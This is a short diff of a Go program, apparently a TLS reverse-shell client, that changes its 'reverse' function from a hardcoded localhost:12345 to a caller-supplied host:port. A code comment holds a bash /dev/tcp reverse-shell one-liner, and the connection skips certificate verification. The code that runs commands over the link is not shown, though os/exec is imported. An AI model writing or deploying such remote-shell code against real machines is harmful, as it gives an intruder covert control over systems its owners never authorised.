@@ -8,6 +8,7 @@ import (
 	"log"
 	"os/exec"
 	"time"
+    "net"
 )
 
 func main() {
@@ -15,7 +16,9 @@ func main() {
 }
 
 // bash -i >& /dev/tcp/localhost/12345 0>&1
-func reverse(host string) {
+func reverse(hostRaw string) {
+    host, port, err := net.SplitHostPort(hostRaw)
+    
 	// читаем ключ и сертификат
 	cert, err := tls.LoadX509KeyPair("client.pem", "client.key")
 
@@ -23,12 +26,9 @@ func reverse(host string) {
 		log.Fatal(err)
 	}
 
-	hostName := "localhost" // change this
-	portNum := "12345"
-
 	// создаем конфиг tls
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
-	c, err := tls.Dial("tcp", hostName+":"+portNum, &config)
+	c, err := tls.Dial("tcp", host+":"+port, &config)
 
 	if nil != err {
 		if nil != c {
